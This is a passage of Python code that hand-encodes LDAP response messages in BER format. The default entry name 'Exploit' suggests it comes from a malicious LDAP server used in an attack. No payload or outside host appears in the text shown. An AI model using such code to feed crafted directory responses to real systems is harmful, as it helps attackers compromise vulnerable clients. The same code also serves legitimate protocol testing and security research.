            def enc_len(l):
                if l < 128: return bytes([l])
                elif l < 256: return bytes([0x81, l])
                else: return bytes([0x82, (l >> 8) & 0xFF, l & 0xFF])

            def enc_tlv(tag, payload):
                return bytes([tag]) + enc_len(len(payload)) + payload

            def enc_str(s):
                b = s.encode() if isinstance(s, str) else s
                return enc_tlv(0x04, b)

            def enc_attr(name, *values):
                vals = b''.join(enc_str(v) for v in values)
                return enc_tlv(0x30, enc_str(name) + enc_tlv(0x31, vals))

            def make_ldap_response(msg_id_byte, attrs_bytes, dn="Exploit"):
                """Wrap attrs into a full LDAP SearchResultEntry + SearchResultDone."""
                search_entry = enc_tlv(0x64, enc_str(dn) + enc_tlv(0x30, attrs_bytes))
                msg1 = enc_tlv(0x30, enc_tlv(0x02, msg_id_byte) + search_entry)
                done  = enc_tlv(0x65, b'\x0a\x01\x00\x04\x00\x04\x00')
                msg2  = enc_tlv(0x30, enc_tlv(0x02, msg_id_byte) + done)
                return msg1 + msg2

